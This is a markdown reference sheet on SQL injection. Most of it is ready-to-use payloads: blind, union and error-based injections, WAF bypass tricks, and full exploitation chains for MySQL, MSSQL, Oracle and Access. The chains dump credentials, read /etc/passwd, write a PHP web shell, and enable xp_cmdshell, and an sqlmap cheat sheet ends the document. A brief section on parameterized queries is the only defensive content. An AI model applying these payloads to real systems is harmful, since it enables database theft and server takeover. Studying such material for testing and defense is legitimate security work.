# Web Security - SQL Injection

> Source: WooYun Vulnerability Database (27,732 SQL injection cases) | Split from web-injection.md

## I. SQL Injection

### 1.1 Vulnerability Essence

```
Missing input validation -> Dynamic SQL concatenation -> Semantic boundary broken -> Database instruction executed
```

**Core Formula**: SQL Injection = Code/data boundary confusion + User input elevated to executable SQL instruction

### 1.2 Detection Methods

#### High-Risk Injection Point Identification

| Vector Type | Percentage | Typical Scenario |
|---|---|---|
| Login form | 66% | Username/password directly concatenated |
| Search box | 64% | LIKE statement fuzzy matching |
| POST parameters | 60% | Form submission |
| HTTP headers | 26% | UA/Referer/XFF |
| GET parameters | 24% | URL parameters |
| Cookie | 12% | Session identifier processing |

**High-frequency parameter names**: `id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`; ASP.NET specific: `__viewstate`, `__eventvalidation`

#### Quick Detection Process

```
1. Single/double quote test -> observe errors
2. Math operation: id=2-1 / id=1*1 -> observe equivalence
3. Boolean test: and 1=1 / and 1=2 -> compare response differences
4. Time delay: and sleep(5) -> observe response time
5. Column probing: order by N -> increment until error
```

#### Database Fingerprinting

| Database | Delay Function | System Table | Error Signature |
|---|---|---|---|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | Cartesian product delay | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 Injection Techniques and Payloads

#### Boolean-Based Blind Injection

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### Time-Based Blind Injection

```sql
-- MySQL (nested delay practical technique)
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### UNION-Based Injection

```sql
id=1 ORDER BY N--              -- Probe column count
id=-1 UNION SELECT 1,2,3,4,5--  -- Identify output positions
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### Error-Based Injection

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- CHAR function to bypass character filtering
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 WAF/Filter Bypass Techniques

#### Inline Comments (Most Common)

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- DeDeCMS bypass example
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### Encoding Bypass

```sql
-- Hex: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- URL double encoding: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### Case Mixing + Whitespace Substitution

```sql
UnIoN SeLeCt                    -- Case mixing
UNION/**/SELECT/**/1,2,3        -- Comment as space
UNION%09SELECT                  -- Tab as space
UNION%0ASELECT                  -- Newline as space
```

#### Function Substitution

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> character A
```

#### Logical Equivalence Substitution

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- Quote bypass
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### Wide-Character Injection (GBK Encoding)

```
%bf%27 bypasses addslashes()   -- Multi-byte character in GBK swallows the backslash
```

#### HTTP-Layer Bypass

```
Parameter pollution: id=1&id=2             -- Duplicate parameter confusion
Chunked transfer: Transfer-Encoding: chunked
X-Forwarded-For injection / Cookie injection  -- Non-standard injection points
```

### 1.5 Exploitation Chains

#### MySQL Full Exploitation Chain

```sql
-- 1.Info -> 2.Database -> 3.Tables -> 4.Columns -> 5.Data -> 6.Files -> 7.Shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQL Full Exploitation Chain

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- Command execution (requires sa privileges)
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### Oracle Exploitation Chain

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### Access Blind Injection Chain

```sql
-- No information_schema; must obtain source or guess table names
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- Enumerate multiple users using NOT IN
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 Defense Measures

```python
# Parameterized queries (preferred)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
```

- Parameterized queries/prepared statements (preferred), stored procedures (secondary)
- Whitelist input validation + force type conversion for numeric parameters
- Database least privilege + hide error messages + WAF deployment

---


---

## Appendix: SQLMap Quick Reference

```bash
# Basic detection
sqlmap -u "http://t/p.php?id=1" --batch
# POST request
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Cookie/HTTP header injection
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# WAF bypass
sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
# Data extraction chain
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```
